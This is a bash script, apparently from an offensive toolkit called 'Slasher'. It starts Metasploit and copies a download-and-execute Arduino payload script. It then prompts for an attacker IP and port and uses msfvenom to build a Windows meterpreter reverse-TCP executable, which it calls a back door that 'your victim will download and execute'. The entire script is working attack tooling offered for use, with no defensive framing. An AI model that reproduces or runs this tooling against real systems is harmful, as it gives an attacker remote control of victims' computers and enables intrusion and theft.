#!/bin/bash
# etc etc etc
# ..................
[[ `id -u` -eq 0 ]] || { echo -e "\e[31mMust be root to run script"; exit 1; }
resize -s 30 60
clear                                   # Clear the screen.
SERVICE=service;

if ps ax | grep -v grep | grep metasploit > /dev/null
then
    echo "$SERVICE service running"
else
    echo "$SERVICE is not running, Starting service." 
    sudo service metasploit start
mkdir ~/Desktop/temp 
clear
clear

echo "#============================================================================================================"
echo "#                               Slasher"
echo "#"
echo "#                       Welcome and dont disclaimer"
echo "#                     Slasher Author By MalwareMix"
echo "#         "
echo "#               contact me in narutofinalform@protonmail.com"
echo "#          "
echo "#============================================================================================================"

echo "Getting Everything Ready For You............"
sleep 1
clear
sleep 1
echo "Setting Up The Matrix.........."
sleep 3
clear
echo "Make Sure Read The Readme.md file!"
sleep 3
echo "Done!"
sleep 3
sudo service metasploit start
fi
mkdir ~/Desktop/temp/
cp /root/Desktop/SlasherFrameWork/Slasher/src/exploit/DownloadExecute.ino /root/Desktop/SlasherFrameWork/Slasher/Output/PayloadScript/
clear
sleep 3
echo "now time to make your back door file that your victim will download and execute!!!"
sleep 3
read -p 'Set LHOST IP: ' uservar; read -p 'Set LPORT: ' userport
            msfvenom -p windows/meterpreter/reverse_tcp LHOST=$uservar LPORT=$userport -f exe > ~/Desktop/temp/backdoor.exe




 
